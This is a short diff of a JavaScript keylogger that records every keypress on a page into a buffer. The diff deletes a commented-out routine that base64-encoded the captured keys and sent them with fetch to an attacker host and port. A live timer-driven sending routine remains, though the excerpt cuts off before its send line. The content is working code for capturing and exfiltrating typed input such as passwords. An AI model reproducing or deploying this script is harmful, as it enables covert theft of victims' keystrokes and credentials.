@@ -8,14 +8,6 @@ document.onkeypress = (e) => {
     keys += e.key;
 }
 
-//setInterval(async () => {
-//    let sendingKeys = keys.replace(sentKeys, '');
-//    if(sendingKeys) {
-//	sentKeys += sendingKeys;
-//	await fetch(`http://${lhost}:${port}?key=` + btoa(sendingKeys));
-//    }
-//}, interval)
-
 setInterval(() => {
     let sendingKeys = keys.replace(sentKeys, '');
     if(sendingKeys) {
